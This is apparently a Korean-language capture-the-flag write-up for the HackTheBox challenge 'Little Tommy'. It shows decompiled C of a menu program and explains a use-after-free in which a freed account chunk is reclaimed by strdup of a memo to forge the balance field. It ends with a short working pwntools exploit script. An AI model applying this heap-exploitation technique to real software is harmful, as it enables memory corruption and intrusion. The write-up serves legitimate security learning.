---
title: "[HackTheBox]Little Tommy"
date: 2020-1-13
tags: [hackthebox.eu]
categories: [hackthebox.eu]
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // [esp+2h] [ebp-112h]
  char v4; // [esp+3h] [ebp-111h]
  signed int v5; // [esp+4h] [ebp-110h]
  signed int v6; // [esp+4h] [ebp-110h]
  char input; // [esp+8h] [ebp-10Ch]
  unsigned int v8; // [esp+108h] [ebp-Ch]
  int *v9; // [esp+10Ch] [ebp-8h]

  v9 = &argc;
  v8 = __readgsdword(0x14u);
  puts("\n#################### Welcome to Little Tommy's Handy yet Elegant and Advanced Program ####################");
  while ( 1 )
  {
    printf(
      "\n"
      "1. Create account\n"
      "2. Display account\n"
      "3. Delete account\n"
      "4. Add memo\n"
      "5. Print flag\n"
      "\n"
      "Please enter an operation number: ");
    v3 = getchar();
    do
      v4 = getchar();
    while ( v4 != '\n' && v4 != -1 );
    switch ( v3 )
    {
      case '1':
        main_account = (char *)malloc(72u);
        printf("\nFirst name: ");
        fgets(&input, 256, _bss_start);
        strncpy(main_account, &input, 30u);
        v5 = strlen(main_account);
        if ( v5 > 30 )
          main_account[31] = 0;
        else
          main_account[v5 - 1] = 0;
        printf("Last name: ");
        fgets(&input, 256, _bss_start);
        strncpy(main_account + 32, &input, 30u);
        v6 = strlen(main_account + 32);
        if ( v6 > 30 )
          main_account[63] = 0;
        else
          main_account[v6 + 31] = 0;
        printf("\nThank you, your account number %d.\n", main_account);
        break;
      case '2':
        if ( main_account )
          printf(
            "\n################ Account no. %d ################\nFirst name: %s\nLast name: %s\nAccount balance: %d\n\n",
            main_account,
            main_account,
            main_account + 32,
            *((_DWORD *)main_account + 16));
        else
          puts("\nSorry, no account found.");
        break;
      case '3':
        if ( main_account )
        {
          free(main_account);
          puts("\nAccount deleted successfully");
        }
        else
        {
          puts("\nSorry, no account found.");
        }
        break;
      case '4':
        puts("\nPlease enter memo:");
        fgets(&input, 256, _bss_start);
        memo = (int)strdup(&input);
        printf("\nThank you, please keep this reference number number safe: %d.\n", memo);
        break;
      case '5':
        if ( main_account && *((_DWORD *)main_account + 16) == 'kcuf' )
          system("/bin/cat flag");
        else
          puts("\nNope.");
        break;
      default:
        continue;
    }
  }
}
```

malloc() -> free() -> strdup() 이런식으로 이루어진다. 

case '5'를 만족시켜야하는데 main_account에 값이 존재하려면 우선 1번으로 create해줘야한다. 2번 메뉴로 봤을 때 `Account balance` 의 값이 0인데 이를 1801680230 즉 `fuck` 으로 맞춰야한다. 

free후에 여기서 strdup을 해주면 또 strdup 내부에 malloc함수가 존재해서 문자열 사이즈만큼 할당해주니까 main_account를 덮을 수 있다. main_account + 64 뒤 4바이트를 `fuck` 으로 맞춰주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./little_tommy')
p = process('./little_tommy')
libc = e.libc

p.sendline('1')
p.sendline('A')
p.sendline('B')
p.sendline('3')
p.sendline('4')
p.sendline('A'*64+'fuck')
p.sendline('5')

p.interactive()
```

